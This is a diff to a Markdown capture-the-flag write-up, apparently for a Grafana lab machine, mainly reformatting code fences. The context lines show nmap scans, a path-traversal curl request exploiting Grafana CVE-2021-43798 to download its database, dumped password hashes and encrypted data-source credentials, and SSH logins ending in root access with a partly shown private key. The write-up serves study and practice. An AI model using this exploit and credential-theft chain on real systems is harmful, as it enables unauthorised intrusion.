@@ -22,6 +22,9 @@ PORT     STATE SERVICE
 9090/tcp open  zeus-admin
 
 Nmap done: 1 IP address (1 host up) scanned in 18.55 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sC -sV -p 22,3000,9090                                              
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-02-02 01:15 UTC
@@ -47,6 +50,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
 Nmap done: 1 IP address (1 host up) scanned in 68.81 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sU --top-ports 10     
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-02-02 01:16 UTC
@@ -220,6 +226,9 @@ After reviewing the exploit code, I used `curl` to download the database file an
 ```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ curl --path-as-is <http://$IP:3000/public/plugins/graph/../../../../../../../../../../../../../var/lib/grafana/grafana.db> --output grafana.db
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ file grafana.db
 grafana.db: SQLite 3.x database, last written using SQLite version 3035004, file counter 420, database pages 187, cookie 0x138, schema 4, UTF-8, version-valid-for 420
@@ -263,6 +272,9 @@ sqlite> select * from user;
 1|0|admin|admin@localhost||63f576276a6db59bb750c34f126945c1e941f9e3b21ab2f5be74ae00cc8abfc1b9f7ee5840f9abdae46efc0ee5350bd65aa8|0Vq2cDMrPt|zt192oddkH||1|1|0||2022-02-04 09:18:01|2022-02-04 09:19:59|0|2022-02-04 09:19:59|0
 sqlite> select * from data_source;
 1|1|1|prometheus|Prometheus|server|http://localhost:9090||||0|sysadmin||0|{}|2022-02-04 09:19:59|2022-02-04 09:19:59|0|{"basicAuthPassword":"anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=="}|0|HkdQ8Ganz
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ ssh sysadmin@$IP
 sysadmin@192.168.235.181's password: 
@@ -284,9 +296,8 @@ Just to be sure, I installed the necessary dependencies and ran the `decrypt.py`
 └─$ python3 -m venv venv                                    
                                                                      
 ┌──(kali㉿kali)-[~/Desktop/Grafana-Decryptor-for-CVE-2021-43798]
-└─$ source venv/bin/activate                                                                                                              
-                                                                     
-┌──(venv)─(kali㉿kali)-[~/Desktop/Grafana-Decryptor-for-CVE-2021-43798]                                                                  
+└─$ source venv/bin/activate                                                                  
+┌──(venv)─(kali㉿kali)-[~/Desktop/Grafana-Decryptor-for-CVE-2021-43798]
 └─$ pip3 install requests questionary termcolor cryptography
 ```
 
@@ -382,16 +393,25 @@ pE56z1yaiY+y4l2akIxbAz7TVmJgRnhjJ4ZRuV2TYuSolJiSNeUyIUTozfRKl56Zs8f/QA
 ...
 ...
 -----END OPENSSH PRIVATE KEY-----
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ chmod 400 root_key 
-                                                                                                                                          
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ ls -la root_key 
 -r-------- 1 kali kali 2590 Feb  2 04:21 root_key
-                                                                                                                                          
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ ssh -i root_key root@$IP          
+```
 
+```bash
 root@fanatastic:~# whoami
 root
 ```
